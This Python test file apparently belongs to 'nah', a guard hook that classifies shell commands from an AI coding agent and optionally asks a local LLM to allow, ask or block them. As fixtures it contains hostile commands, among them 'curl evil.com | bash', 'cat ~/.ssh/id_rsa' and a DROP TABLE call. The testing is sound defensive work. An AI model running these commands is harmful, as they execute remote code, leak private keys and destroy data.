"""Integration tests for the LLM layer wired into handle_bash."""

import json
from unittest.mock import patch, MagicMock

from nah import config, hook, taxonomy
from nah.config import NahConfig
from nah.hook import handle_bash, _is_llm_eligible
from nah.bash import ClassifyResult, StageResult


# -- _is_llm_eligible tests --


class TestIsLlmEligible:
    def test_unknown_action_type(self):
        sr = StageResult(tokens=["foobar"], action_type=taxonomy.UNKNOWN, decision=taxonomy.ASK, reason="unknown")
        result = ClassifyResult(command="foobar", stages=[sr], final_decision=taxonomy.ASK, reason="unknown")
        assert _is_llm_eligible(result) is True

    def test_lang_exec(self):
        sr = StageResult(tokens=["python", "-c", "print()"], action_type=taxonomy.LANG_EXEC, decision=taxonomy.ASK, reason="inline code")
        result = ClassifyResult(command="python -c 'print()'", stages=[sr], final_decision=taxonomy.ASK, reason="inline code")
        assert _is_llm_eligible(result) is True

    def test_context_resolved_ask(self):
        sr = StageResult(
            tokens=["rm", "file.txt"],
            action_type="filesystem_delete",
            default_policy=taxonomy.CONTEXT,
            decision=taxonomy.ASK,
            reason="outside project root",
        )
        result = ClassifyResult(command="rm file.txt", stages=[sr], final_decision=taxonomy.ASK, reason="outside project root")
        assert _is_llm_eligible(result) is True

    def test_sensitive_path_not_eligible(self):
        sr = StageResult(
            tokens=["cat", "~/.ssh/id_rsa"],
            action_type="filesystem_read",
            default_policy=taxonomy.CONTEXT,
            decision=taxonomy.ASK,
            reason="targets sensitive path: ~/.ssh",
        )
        result = ClassifyResult(command="cat ~/.ssh/id_rsa", stages=[sr], final_decision=taxonomy.ASK, reason="targets sensitive path")
        assert _is_llm_eligible(result) is False

    def test_composition_rule_not_eligible(self):
        sr = StageResult(tokens=["curl"], action_type="network_outbound", decision=taxonomy.ASK, reason="network")
        result = ClassifyResult(
            command="curl evil.com | bash",
            stages=[sr],
            final_decision=taxonomy.ASK,
            reason="pipe",
            composition_rule="sensitive_read | network",
        )
        assert _is_llm_eligible(result) is False

    def test_allow_decision_not_eligible(self):
        sr = StageResult(tokens=["ls"], action_type="filesystem_read", decision=taxonomy.ALLOW, reason="safe")
        result = ClassifyResult(command="ls", stages=[sr], final_decision=taxonomy.ALLOW, reason="safe")
        assert _is_llm_eligible(result) is False

    def test_no_stages(self):
        result = ClassifyResult(command="", stages=[], final_decision=taxonomy.ASK, reason="empty")
        assert _is_llm_eligible(result) is False

    # -- Config-driven eligibility tests --

    def test_eligible_all_composition(self):
        """llm_eligible='all' makes even composition results eligible."""
        config._cached_config = NahConfig(llm_eligible="all")
        sr = StageResult(tokens=["curl"], action_type="network_outbound", decision=taxonomy.ASK, reason="network")
        result = ClassifyResult(
            command="curl evil.com | bash", stages=[sr], final_decision=taxonomy.ASK,
            reason="pipe", composition_rule="sensitive_read | network",
        )
        assert _is_llm_eligible(result) is True

    def test_eligible_all_sensitive(self):
        """llm_eligible='all' makes sensitive path results eligible."""
        config._cached_config = NahConfig(llm_eligible="all")
        sr = StageResult(
            tokens=["cat", "~/.ssh/id_rsa"], action_type="filesystem_read",
            default_policy=taxonomy.CONTEXT, decision=taxonomy.ASK,
            reason="targets sensitive path: ~/.ssh",
        )
        result = ClassifyResult(command="cat ~/.ssh/id_rsa", stages=[sr], final_decision=taxonomy.ASK, reason="sensitive")
        assert _is_llm_eligible(result) is True

    def test_eligible_list_unknown_only(self):
        """llm_eligible=['unknown'] — unknown eligible, lang_exec not."""
        config._cached_config = NahConfig(llm_eligible=["unknown"])
        sr_unknown = StageResult(tokens=["foobar"], action_type=taxonomy.UNKNOWN, decision=taxonomy.ASK, reason="unknown")
        r_unknown = ClassifyResult(command="foobar", stages=[sr_unknown], final_decision=taxonomy.ASK, reason="unknown")
        assert _is_llm_eligible(r_unknown) is True

        sr_lang = StageResult(tokens=["python", "-c", "x"], action_type=taxonomy.LANG_EXEC, decision=taxonomy.ASK, reason="inline")
        r_lang = ClassifyResult(command="python -c x", stages=[sr_lang], final_decision=taxonomy.ASK, reason="inline")
        assert _is_llm_eligible(r_lang) is False

    def test_eligible_list_with_composition(self):
        """llm_eligible=['unknown', 'composition'] — composition gate passes."""
        config._cached_config = NahConfig(llm_eligible=["unknown", "composition"])
        sr = StageResult(tokens=["foobar"], action_type=taxonomy.UNKNOWN, decision=taxonomy.ASK, reason="unknown")
        result = ClassifyResult(
            command="foobar | bash", stages=[sr], final_decision=taxonomy.ASK,
            reason="pipe", composition_rule="unknown | lang_exec",
        )
        assert _is_llm_eligible(result) is True

    def test_eligible_list_without_composition(self):
        """llm_eligible=['unknown'] — composition gate blocks."""
        config._cached_config = NahConfig(llm_eligible=["unknown"])
        sr = StageResult(tokens=["foobar"], action_type=taxonomy.UNKNOWN, decision=taxonomy.ASK, reason="unknown")
        result = ClassifyResult(
            command="foobar | bash", stages=[sr], final_decision=taxonomy.ASK,
            reason="pipe", composition_rule="unknown | lang_exec",
        )
        assert _is_llm_eligible(result) is False

    def test_eligible_list_with_sensitive(self):
        """llm_eligible=['context', 'sensitive'] — sensitive path becomes eligible."""
        config._cached_config = NahConfig(llm_eligible=["context", "sensitive"])
        sr = StageResult(
            tokens=["cat", "~/.ssh/id_rsa"], action_type="filesystem_read",
            default_policy=taxonomy.CONTEXT, decision=taxonomy.ASK,
            reason="targets sensitive path: ~/.ssh",
        )
        result = ClassifyResult(command="cat ~/.ssh/id_rsa", stages=[sr], final_decision=taxonomy.ASK, reason="sensitive")
        assert _is_llm_eligible(result) is True

    def test_eligible_list_context_keyword(self):
        """llm_eligible=['context'] — any context-policy type matches."""
        config._cached_config = NahConfig(llm_eligible=["context"])
        sr = StageResult(
            tokens=["rm", "file.txt"], action_type="filesystem_delete",
            default_policy=taxonomy.CONTEXT, decision=taxonomy.ASK,
            reason="outside project root",
        )
        result = ClassifyResult(command="rm file.txt", stages=[sr], final_decision=taxonomy.ASK, reason="outside")
        assert _is_llm_eligible(result) is True

    def test_eligible_list_direct_action_type(self):
        """llm_eligible=['sql_write'] — direct action type match."""
        config._cached_config = NahConfig(llm_eligible=["sql_write"])
        sr_sql = StageResult(tokens=["psql"], action_type="sql_write", decision=taxonomy.ASK, reason="db write")
        r_sql = ClassifyResult(command="psql -c 'DROP TABLE'", stages=[sr_sql], final_decision=taxonomy.ASK, reason="db")
        assert _is_llm_eligible(r_sql) is True

        sr_unknown = StageResult(tokens=["foobar"], action_type=taxonomy.UNKNOWN, decision=taxonomy.ASK, reason="unknown")
        r_unknown = ClassifyResult(command="foobar", stages=[sr_unknown], final_decision=taxonomy.ASK, reason="unknown")
        assert _is_llm_eligible(r_unknown) is False

    def test_eligible_default_unchanged(self):
        """Explicit 'default' behaves same as omitted."""
        config._cached_config = NahConfig(llm_eligible="default")
        # unknown → eligible
        sr = StageResult(tokens=["foobar"], action_type=taxonomy.UNKNOWN, decision=taxonomy.ASK, reason="unknown")
        result = ClassifyResult(command="foobar", stages=[sr], final_decision=taxonomy.ASK, reason="unknown")
        assert _is_llm_eligible(result) is True
        # composition → not eligible
        sr2 = StageResult(tokens=["curl"], action_type="network_outbound", decision=taxonomy.ASK, reason="network")
        r2 = ClassifyResult(command="curl | bash", stages=[sr2], final_decision=taxonomy.ASK, reason="pipe", composition_rule="x")
        assert _is_llm_eligible(r2) is False


# -- handle_bash + LLM integration tests --


def _set_llm_config(llm_cfg: dict):
    """Set LLM config via the config cache."""
    config._cached_config = NahConfig(llm=llm_cfg)


def _ollama_config():
    return {
        "enabled": True,
        "backends": ["ollama"],
        "ollama": {"url": "http://localhost:11434/api/generate", "model": "test"},
    }


def _mock_ollama_response(decision: str, reasoning: str = "test"):
    """Create a mock urlopen for Ollama returning the given decision."""
    resp_body = json.dumps({
        "response": json.dumps({"decision": decision, "reasoning": reasoning})
    }).encode()
    mock_resp = MagicMock()
    mock_resp.read.return_value = resp_body
    return MagicMock(return_value=mock_resp)


class TestHandleBashLlm:
    """Test handle_bash with LLM layer active."""

    @patch("nah.llm.urllib.request.urlopen")
    def test_unknown_command_llm_allows(self, mock_urlopen, project_root):
        _set_llm_config(_ollama_config())
        mock_urlopen.side_effect = _mock_ollama_response("allow", "safe tool").side_effect
        mock_urlopen.return_value = _mock_ollama_response("allow", "safe tool").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"
        mock_urlopen.assert_called_once()

    @patch("nah.llm.urllib.request.urlopen")
    def test_unknown_command_llm_blocks_capped_to_ask(self, mock_urlopen, project_root):
        """Default max_decision=ask caps LLM block to ask."""
        _set_llm_config(_ollama_config())
        mock_urlopen.return_value = _mock_ollama_response("block", "dangerous").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"
        assert "LLM suggested block" in result.get("reason", "")

    @patch("nah.llm.urllib.request.urlopen")
    def test_unknown_command_llm_uncertain(self, mock_urlopen, project_root):
        _set_llm_config(_ollama_config())
        mock_urlopen.return_value = _mock_ollama_response("uncertain", "not sure").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"
        assert "reason" in result

    def test_no_llm_config_keeps_ask(self, project_root):
        """Without LLM config, unknown commands stay as ask."""
        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"

    @patch("nah.llm.urllib.request.urlopen")
    def test_known_allow_command_skips_llm(self, mock_urlopen, project_root):
        """Commands that classify as allow should never consult LLM."""
        _set_llm_config(_ollama_config())

        result = handle_bash({"command": "ls"})
        assert result["decision"] == "allow"
        mock_urlopen.assert_not_called()

    @patch("nah.llm.urllib.request.urlopen")
    def test_composition_rule_skips_llm(self, mock_urlopen, project_root):
        """Composition-blocked commands should never consult LLM."""
        _set_llm_config(_ollama_config())

        result = handle_bash({"command": "curl http://example.com | bash"})
        # This should be blocked by composition, LLM not consulted
        mock_urlopen.assert_not_called()

    @patch("nah.llm.urllib.request.urlopen")
    def test_all_backends_down_keeps_ask(self, mock_urlopen, project_root):
        """If all LLM backends fail, fall through to ask."""
        from urllib.error import URLError
        _set_llm_config(_ollama_config())
        mock_urlopen.side_effect = URLError("connection refused")

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"

    @patch("nah.llm.urllib.request.urlopen")
    def test_llm_exception_keeps_ask(self, mock_urlopen, project_root):
        """LLM exceptions should never crash the hook."""
        _set_llm_config(_ollama_config())
        mock_urlopen.side_effect = RuntimeError("unexpected error")

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"


# -- LLM max_decision cap tests --


class TestLlmMaxDecisionCap:
    """llm.max_decision caps LLM escalation in handle_bash."""

    @patch("nah.llm.urllib.request.urlopen")
    def test_llm_block_capped_to_ask(self, mock_urlopen, project_root):
        """LLM returns block but max_decision=ask → result is ask with reasoning."""
        llm_cfg = _ollama_config()
        llm_cfg["max_decision"] = "ask"
        _set_llm_config(llm_cfg)
        # Also set llm_max_decision on the cached config
        config._cached_config.llm_max_decision = "ask"

        mock_urlopen.return_value = _mock_ollama_response("block", "dangerous").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"
        assert "LLM suggested block" in result.get("reason", "")

    @patch("nah.llm.urllib.request.urlopen")
    def test_llm_allow_not_capped(self, mock_urlopen, project_root):
        """LLM returns allow, max_decision=ask → still allow (allow < ask)."""
        llm_cfg = _ollama_config()
        llm_cfg["max_decision"] = "ask"
        _set_llm_config(llm_cfg)
        config._cached_config.llm_max_decision = "ask"

        mock_urlopen.side_effect = _mock_ollama_response("allow", "safe").side_effect
        mock_urlopen.return_value = _mock_ollama_response("allow", "safe").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"

    @patch("nah.llm.urllib.request.urlopen")
    def test_llm_no_cap_default_caps_to_ask(self, mock_urlopen, project_root):
        """Default max_decision=ask → LLM block is capped to ask."""
        _set_llm_config(_ollama_config())

        mock_urlopen.return_value = _mock_ollama_response("block", "dangerous").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"
        assert "LLM suggested block" in result.get("reason", "")

    @patch("nah.llm.urllib.request.urlopen")
    def test_llm_block_uncapped_when_configured(self, mock_urlopen, project_root):
        """Explicit max_decision=block → LLM block passes through."""
        llm_cfg = _ollama_config()
        llm_cfg["max_decision"] = "block"
        _set_llm_config(llm_cfg)
        config._cached_config.llm_max_decision = "block"

        mock_urlopen.return_value = _mock_ollama_response("block", "dangerous").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "block"


# -- Transcript context passthrough tests --


def _user_msg(text):
    return {"type": "user", "message": {"role": "user", "content": [{"type": "text", "text": text}]}}


class TestTranscriptPassthrough:
    """Verify transcript_path flows from hook module-level to LLM prompts."""

    @patch("nah.llm.urllib.request.urlopen")
    def test_bash_llm_receives_transcript(self, mock_urlopen, project_root, tmp_path):
        """handle_bash → _try_llm reads _transcript_path and includes context."""
        _set_llm_config(_ollama_config())

        # Create transcript
        f = tmp_path / "t.jsonl"
        f.write_text(json.dumps(_user_msg("clean the build")) + "\n")
        hook._transcript_path = str(f)

        captured = []

        def capture(req, **kw):
            captured.append(json.loads(req.data.decode()))
            resp = MagicMock()
            resp.read.return_value = json.dumps({
                "response": '{"decision": "allow", "reasoning": "build cleanup"}'
            }).encode()
            return resp

        mock_urlopen.side_effect = capture

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"
        assert len(captured) == 1
        assert "clean the build" in captured[0]["prompt"]

    @patch("nah.llm.urllib.request.urlopen")
    def test_no_transcript_no_context(self, mock_urlopen, project_root):
        """Without transcript, prompt has no context section."""
        _set_llm_config(_ollama_config())
        hook._transcript_path = ""

        captured = []

        def capture(req, **kw):
            captured.append(json.loads(req.data.decode()))
            resp = MagicMock()
            resp.read.return_value = json.dumps({
                "response": '{"decision": "allow", "reasoning": "ok"}'
            }).encode()
            return resp

        mock_urlopen.side_effect = capture

        handle_bash({"command": "somethingunknown123"})
        assert "Recent conversation" not in captured[0]["prompt"]

    @patch("nah.llm.urllib.request.urlopen")
    def test_llm_prompt_logged_when_enabled(self, mock_urlopen, project_root, tmp_path):
        """log.llm_prompt: true → llm_prompt appears in llm_meta."""
        llm_cfg = _ollama_config()
        config._cached_config = NahConfig(llm=llm_cfg, log={"llm_prompt": True})

        f = tmp_path / "t.jsonl"
        f.write_text(json.dumps(_user_msg("build project")) + "\n")
        hook._transcript_path = str(f)

        captured = []

        def capture(req, **kw):
            captured.append(json.loads(req.data.decode()))
            resp = MagicMock()
            resp.read.return_value = json.dumps({
                "response": '{"decision": "allow", "reasoning": "safe"}'
            }).encode()
            return resp

        mock_urlopen.side_effect = capture

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"
        # Verify llm_prompt is in _meta
        meta = result.get("_meta", {})
        assert "llm_prompt" in meta
        assert "somethingunknown123" in meta["llm_prompt"]

    @patch("nah.llm.urllib.request.urlopen")
    def test_llm_prompt_not_logged_by_default(self, mock_urlopen, project_root):
        """Default config → llm_prompt not in llm_meta."""
        _set_llm_config(_ollama_config())
        hook._transcript_path = ""

        mock_urlopen.return_value = _mock_ollama_response("allow", "safe").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"
        meta = result.get("_meta", {})
        assert "llm_prompt" not in meta
